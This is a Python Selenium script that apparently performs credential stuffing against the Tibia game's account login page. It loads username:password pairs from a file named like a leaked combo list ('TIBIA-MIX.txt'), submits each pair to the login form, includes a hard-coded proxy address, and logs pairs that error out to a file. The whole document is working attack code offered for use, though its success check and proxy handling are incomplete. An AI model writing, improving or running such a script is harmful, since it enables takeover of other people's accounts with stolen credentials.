from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class Credential:
  def __init__(self, username, password):
    self.username = username
    self.password = password

def saveCredntialResultToFile(credential,fileName):
    f=open(fileName, "a+")
    f.write(credential.username + ":" + credential.password)
    f.close()

#getProxyFrom proxylist
def getProxy(idProxy):
    proxy=["91.203.5.175:443"]
    return proxy[idProxy]


def getCredentialsFromFile():
    credentials = []
    f=open("TIBIA-MIX.txt", "r")
    f1 = f.readlines()
    for line in f1:
        result = line.split(':')
        username = result[0]
        password = result[1]
        crednetial = Credential(username,password)
        credentials.append(crednetial)
    
    f.close()
    return credentials

#set manually 
childsOfBodyForBlankPageBoundary = 4

proxyId = -1
isProxy = False
chrome_options = None
browser = None

credentials = getCredentialsFromFile()

for credential in credentials:
    try:
        if(isProxy):
            browser = webdriver.Chrome(options=chrome_options)
        else:
            browser = webdriver.Chrome()

        usernameStr = credential.username
        passwordStr = credential.password

        browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

        username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
        username.send_keys(usernameStr)
        password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
        password.send_keys(passwordStr)
        current_url = browser.current_url
        signInButton = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.NAME, 'Login')))

        current_url = browser.current_url

        signInButton.submit()
    except:
        saveCredntialResultToFile(credential,"exceptions.txt")
    finally:
        browser.quit()
        

